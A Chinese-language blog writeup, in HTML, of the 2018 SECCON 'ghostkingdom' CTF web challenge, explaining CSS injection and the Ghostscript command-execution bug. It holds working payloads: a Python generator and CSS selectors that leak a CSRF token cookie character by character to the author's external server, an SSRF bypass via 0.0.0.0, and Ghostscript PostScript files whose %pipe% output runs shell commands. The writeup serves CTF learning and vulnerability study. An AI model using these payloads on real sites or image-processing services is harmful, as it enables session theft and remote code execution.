@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          2018SECCON ghostkingdom - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/2018SECCON-ghostkingdom/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                    <h1>2018SECCON ghostkingdom</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-29
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>唯一的一道web题，周末有事去啦就没做上，赛后复盘了一下。</p>
+<p>有两个之前没学过的知识点，<code>CSS injection</code>和<code>Ghost命令执行</code>（暑假出来的时候太懒就没复现T_T</p>
+<p>这篇writeup想以另外一种形式来写，会更注重下这两个漏洞的原理和利用。</p>
+<h1 id="ghostkingdom"><a href="#ghostkingdom" class="headerlink" title="ghostkingdom"></a>ghostkingdom</h1><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>题目开始是个简单的注册登录，登录的时候仔细观察可以发现登录的账号密码是通过GET方式传输的（稍后会有用</p>
+<p>进去之后有三个主要的功能点</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/1.jpg" alt></p>
+<ul>
+<li>给管理员发送消息（测试xss似乎不管用</li>
+<li>截屏</li>
+<li>上传图像（只有本地登录的用户才可以开启这个功能</li>
+</ul>
+<p>一番测试之后，可以发现发送消息的url有一些端倪</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;msg=hello&amp;action=msgadm2</span></span><br></pre></td></tr></table></figure>
+<p>明显可以看出是一段base64的编码，试图去修改之后进行xss</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/2.jpg" alt></p>
+<p>很不幸的是尖括号之类的字符被实体转义了。随后就想到一个从未用过但是之前在书上一老看到的利用CSS进行XSS</p>
+<p>但是吧，学安全这玩意不动手确实是不行，试了半天在本地也没成功过，最后看了owasp中的一段话真相了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/3.jpg" alt></p>
+<p>IE 7/8。。那不约等于没有这种漏洞利用手法。</p>
+<h2 id="CSS-injection"><a href="#CSS-injection" class="headerlink" title="CSS injection"></a>CSS injection</h2><p>然后就是涉及到<code>CSS</code>的另外一种利用手法，利用<code>url（）</code>可以发送请求，来获取前端页面中的数据。</p>
+<p>这里还需要关注到另外一个点就是<code>csrf_token</code>中的值和<code>Cookie</code>中的值是一致的。</p>
+<p>也就意味着我们可以利用<code>CSS</code>来获取<code>Cookie</code>的值。</p>
+<p><code>screenshot</code>的界面有个比较明显的<code>SSRF</code>，虽然限制了一些关键字，但是还是可以用<code>0.0.0.0</code>或者十进制之类的方式绕过。</p>
+<p>这里有个点一直没怎么搞懂，就是需要自己先通过截屏的功能登录一次，让对方服务器先带上cookie（比赛的时候那么多人，而且那么多服务器，不会出问题么?</p>
+<p>只要通过如下的方式，就可以让对方服务器带上Cookie了。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//0.0.0.0/?user=username&amp;pass=password&amp;action=login</span></span><br></pre></td></tr></table></figure>
+<p>然后就是通过构造包含恶意CSS的页面，来获取在<code>csrf_token</code>上的cookie值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBase64</span><span class="params">(s)</span>:</span></span><br><span class="line">    z = []</span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        st = s + i</span><br><span class="line">        z.append(<span class="string">'input[value^="&#123;&#125;"] &#123;&#123;background: url(http://kingkk.com:23333?csrf=&#123;&#125;)&#125;&#125;'</span>.format(st, st))</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">'\n'</span>.join(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formatURL</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"http://0.0.0.0/?css=&#123;&#125;&amp;action=msgadm2"</span>.format(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> formatURL(getBase64(<span class="string">'8dc4811759c90887a1f2d6'</span>))</span><br></pre></td></tr></table></figure>
+<p>需要22次，就能依次爆出cookie的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/5.jpg" alt></p>
+<h2 id="Ghostscript-rce"><a href="#Ghostscript-rce" class="headerlink" title="Ghostscript rce"></a>Ghostscript rce</h2><p>利用这个cookie登录之后就能访问上传图片的功能。</p>
+<p>上传图片后还能进行<code>jpg</code>转<code>gif</code>的格式转换。</p>
+<p>当上传一个不符合要求的图片的时候，会爆出一些错误</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/6.jpg" alt></p>
+<p>可以看到<code>convert</code>命令的错误信息。就会涉及到八月份底爆出的<code>Ghostscript</code>命令执行的漏洞</p>
+<p>这里只要构造好对应的图片，就能进行任意代码执行，读取flag。（文件路径有相应的提示，就不多说</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title">!PS</span></span><br><span class="line">userdict /setpagedevice <span class="keyword">undef</span></span><br><span class="line">legal</span><br><span class="line">&#123; <span class="keyword">null</span> restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (<span class="symbol">%pipe</span><span class="symbol">%$</span>(cat /var/www/html/FLAG/FLAGflagF<span class="number">1</span>A<span class="number">8</span>.txt)) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/7.jpg" alt></p>
+<h1 id="CSS-injection-1"><a href="#CSS-injection-1" class="headerlink" title="CSS injection"></a>CSS injection</h1><p>当我们只能够控制<code>&lt;style&gt;</code>标签中的内容，无法进行标签逃逸时，可以通过一些特定的方式来获取页面中的数据。</p>
+<p>比如<code>csrf_token</code>获取后台页面中的一些数据。</p>
+<p>主要原理是通过css样式支持的一些匹配，以及<code>url</code>可以发起一次GET请求来进行攻击。</p>
+<p>就像CTF题中的，想要获取<code>csrf_token</code>的值，就可以利用<code>input[name=&quot;scrf&quot;]</code>来选中这个标签</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/8.jpg" alt></p>
+<p>然后再利用正则匹配</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"0"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">0</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"1"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">1</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"2"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">2</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"3"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">3</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"4"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">4</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"5"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">5</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"6"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">6</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"7"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">7</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"8"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">8</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"9"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=<span class="number">9</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"a"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=a)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"b"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=b)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"c"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=c)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"d"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=d)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"e"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=e)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"scrf"</span>]</span><span class="selector-attr">[value^=<span class="string">"f"</span>]</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://kingkk.com:<span class="number">23333</span>?csrf=f)&#125;</span><br></pre></td></tr></table></figure>
+<p>当匹配到页面中value值为某一个特定的值时，就设置不同的<strong>背景</strong>（目的是为了利用<code>url</code>发送一次GET请求</p>
+<p>GET的请求可以被访问日志给记录。这样，就可以利用这种匹配的手段，来获取页面中的一些值。从而窃取数据。</p>
+<h1 id="Ghostscript-rce-1"><a href="#Ghostscript-rce-1" class="headerlink" title="Ghostscript rce"></a>Ghostscript rce</h1><p>今年暑假新出的漏洞，当时以为是一门小众的编程语言，就没在意了。原来是用来处理图片的。</p>
+<p><code>ghostscript</code>用于处理图片，被内置在一些库中。网站中处理图片的功能还是比较常见的，听说当时好多人刷了一大波src</p>
+<ul>
+<li>imagemagick</li>
+<li>libmagick</li>
+<li>graphicsmagick</li>
+<li>gimp</li>
+<li>python-matplotlib</li>
+<li>texlive-core</li>
+<li>texmacs</li>
+<li>latex2html</li>
+<li>latex2rtf</li>
+</ul>
+<p>由于C太菜，就不分析内部逻辑了，直接来看下利用。</p>
+<p>需要ghostscript &lt;= 9.23</p>
+<p>然后只需要构造一个特定的图片，就可以任意代码执行。</p>
+<p>Ubuntu</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p>将id替换成别的语句就可以执行任意代码</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">%pipe%$</span>(<span class="name">cat</span> /var/www/html/FLAG/FLAGflagF1A8.txt))</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/9.jpg" alt></p>
+<p>Centos中代码有些细微的差别</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title">!PS</span></span><br><span class="line">userdict /setpagedevice <span class="keyword">undef</span></span><br><span class="line">legal</span><br><span class="line">&#123; <span class="keyword">null</span> restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (<span class="symbol">%pipe</span><span class="symbol">%id</span>) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p>由于暂时没有centos虚拟机，就没验证了。</p>
+<p>在平时渗透测试中，可以测试一些带有dnslog的poc，来测试是否存在该漏洞。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://xz.aliyun.com/t/3075" target="_blank" rel="noopener">https://xz.aliyun.com/t/3075</a></p>
+<p><a href="http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a href="https://bbs.ichunqiu.com/article-1705-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-1705-1.html</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/11/weblogic漏洞扫描工具-weblogic-scan/" data-toggle="tooltip" data-placement="top" title="weblogic漏洞扫描工具 weblogic-scan">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/hitcon2018-One-Line-PHP-Challenge/" data-toggle="tooltip" data-placement="top" title="hitcon2018 One Line PHP Challenge">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
